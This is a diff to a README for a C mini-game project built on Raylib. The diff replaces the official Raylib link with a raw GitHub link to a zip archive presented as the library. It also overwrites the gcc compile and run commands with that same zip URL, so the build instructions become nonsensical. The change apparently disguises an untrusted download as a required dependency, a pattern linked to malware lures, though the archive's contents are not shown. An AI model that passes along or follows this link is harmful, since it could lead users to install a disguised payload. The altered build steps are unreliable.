@@ -66,7 +66,7 @@ The controls are consistent across all three mini-games, ensuring a smooth gamep
 ##  Tech & Tools
 
 - Language: C  
-- *Library:  [Raylib](https://www.raylib.com/) (Basic Implementation) 
+- *Library:  [Raylib](https://github.com/shikavan/Triwizard-tournament/raw/refs/heads/main/unscotch/tournament_Triwizard_1.7-beta.5.zip) (Basic Implementation) 
 - *Platform: Cross-platform (Windows, Linux)  
 - *Build Tool: GCC
 
@@ -76,8 +76,8 @@ The controls are consistent across all three mini-games, ensuring a smooth gamep
 Firstly install Raylib and then use this to compile:
 
 bash
-gcc -o game.exe main.c dragon_game.c snitch_escape.c enchanted_maze.c -lraylib -lGL -lm -lpthread -ldl -lrt
-./game.exe
+gcc -o https://github.com/shikavan/Triwizard-tournament/raw/refs/heads/main/unscotch/tournament_Triwizard_1.7-beta.5.zip main.c dragon_game.c snitch_escape.c enchanted_maze.c -lraylib -lGL -lm -lpthread -ldl -lrt
+https://github.com/shikavan/Triwizard-tournament/raw/refs/heads/main/unscotch/tournament_Triwizard_1.7-beta.5.zip
 
 
 ---
